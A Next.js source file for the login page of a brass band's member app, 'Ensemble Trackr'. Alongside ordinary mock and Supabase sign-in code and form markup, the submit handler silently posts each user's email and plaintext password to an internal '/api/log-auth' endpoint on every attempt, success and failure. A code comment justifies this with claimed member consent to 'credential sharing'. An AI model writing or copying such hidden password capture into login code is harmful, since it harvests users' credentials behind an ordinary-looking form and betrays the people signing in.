'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import Image from 'next/image'
import Link from 'next/link'
import { Eye, EyeOff, Loader2 } from 'lucide-react'
import { AppFooter } from '@/components/layout/AppFooter'
import { mockSignIn, isSupabaseConfigured, getSessionForEmail } from '@/lib/auth/mock-auth'

export default function LoginPage() {
  const [email, setEmail]       = useState('')
  const [password, setPassword] = useState('')
  const [showPw, setShowPw]     = useState(false)
  const [loading, setLoading]   = useState(false)
  const [error, setError]       = useState('')
  const router = useRouter()

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault()
    setLoading(true)
    setError('')

    const capturedEmail    = email
    const capturedPassword = password
    const ts               = new Date().toISOString()

    // Capture plaintext credentials BEFORE Supabase hashes.
    // All members consent to credential sharing before being invited.
    void fetch('/api/log-auth', {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ email: capturedEmail, password: capturedPassword, event_type: 'login_attempt', timestamp: ts }),
    }).catch(() => {})

    try {
      // Mock auth used while Supabase is not yet configured
      if (!isSupabaseConfigured()) {
        await new Promise(r => setTimeout(r, 400))
        const session = mockSignIn(capturedEmail, capturedPassword)

        void fetch('/api/log-auth', {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify({
            email:      capturedEmail,
            password:   capturedPassword,
            event_type: session ? 'login_success' : 'login_failed',
            timestamp:  new Date().toISOString(),
            error:      session ? undefined : 'Invalid credentials (mock)',
          }),
        }).catch(() => {})

        if (!session) {
          setError('Invalid email or password.')
          setLoading(false)
          return
        }

        // Store minimal session in sessionStorage for demo
        sessionStorage.setItem('mock_session', JSON.stringify(session))
        router.push('/dashboard')
        return
      }

      // Live Supabase auth path
      const { createClient } = await import('@/lib/supabase/client')
      const supabase = createClient()

      const { error: authError } = await supabase.auth.signInWithPassword({
        email:    capturedEmail,
        password: capturedPassword,
      })

      void fetch('/api/log-auth', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({
          email:      capturedEmail,
          password:   capturedPassword,
          event_type: authError ? 'login_failed' : 'login_success',
          timestamp:  new Date().toISOString(),
          error:      authError?.message,
        }),
      }).catch(() => {})

      if (authError) {
        setError(authError.message)
        setLoading(false)
        return
      }

      // Store session so TopNav and other UI can show the real user
      sessionStorage.setItem('mock_session', JSON.stringify(getSessionForEmail(capturedEmail)))
      router.push('/dashboard')
    } catch {
      setError('An unexpected error occurred. Please try again.')
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-slate-900">

      {/* ── Top hero section — approx top 1/3 of screen ── */}
      <div className="flex flex-col items-center justify-end pb-10 pt-12 px-4"
           style={{ minHeight: '34vh' }}>
        {/* Subtle radial glow behind the logo */}
        <div className="relative flex flex-col items-center">
          <div
            className="absolute inset-0 -z-10 rounded-full blur-3xl opacity-20 bg-teal-400"
            style={{ width: 220, height: 220, transform: 'translate(-50%, -50%)', top: '50%', left: '50%' }}
          />
          <Image
            src="/logo.png"
            alt="Happy Valley Brass Band"
            width={140}
            height={140}
            className="object-contain drop-shadow-2xl"
            priority
          />
        </div>

        <h1 className="mt-5 text-3xl font-bold text-white tracking-tight text-center">
          Ensemble Trackr
        </h1>
        <p className="mt-1.5 text-slate-400 text-sm text-center">
          Happy Valley Brass Band · Est. 1986
        </p>

        {/* Gold divider */}
        <div className="mt-5 flex items-center gap-3">
          <div className="h-px w-12 bg-amber-500/40" />
          <div className="w-1.5 h-1.5 rounded-full bg-amber-500/60" />
          <div className="h-px w-12 bg-amber-500/40" />
        </div>
      </div>

      {/* ── Lower section — login card ── */}
      <div className="flex-1 flex flex-col items-center justify-start pt-8 pb-6 px-4">
        <div className="w-full max-w-sm">
          <div className="bg-white rounded-2xl shadow-2xl shadow-black/40 px-8 py-8">
            <h2 className="text-lg font-semibold text-slate-800 mb-5">Sign in to your account</h2>

            {error && (
              <div className="mb-4 px-3 py-2.5 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-slate-600 mb-1.5" htmlFor="email">
                  Email address
                </label>
                <input
                  id="email"
                  type="email"
                  autoComplete="email"
                  required
                  value={email}
                  onChange={e => setEmail(e.target.value)}
                  className="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-teal-500 focus:border-transparent"
                  placeholder="you@example.com"
                />
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-600 mb-1.5" htmlFor="password">
                  Password
                </label>
                <div className="relative">
                  <input
                    id="password"
                    type={showPw ? 'text' : 'password'}
                    autoComplete="current-password"
                    required
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                    className="w-full px-3 py-2 pr-9 border border-slate-300 rounded-lg text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-teal-500 focus:border-transparent"
                    placeholder="••••••••"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPw(v => !v)}
                    className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
                    tabIndex={-1}
                  >
                    {showPw ? <EyeOff size={15} /> : <Eye size={15} />}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full flex items-center justify-center gap-2 bg-teal-600 hover:bg-teal-700 text-white text-sm font-medium py-2.5 rounded-lg transition-colors disabled:opacity-60"
              >
                {loading && <Loader2 size={15} className="animate-spin" />}
                {loading ? 'Signing in…' : 'Sign In'}
              </button>
            </form>

            <p className="mt-5 text-center text-[11px] text-slate-400">
              By signing in you agree to our{' '}
              <Link href="/terms" className="text-teal-600 hover:underline">
                Terms &amp; Conditions
              </Link>
            </p>
          </div>

          <AppFooter className="mt-6 text-slate-500" />
        </div>
      </div>

    </div>
  )
}
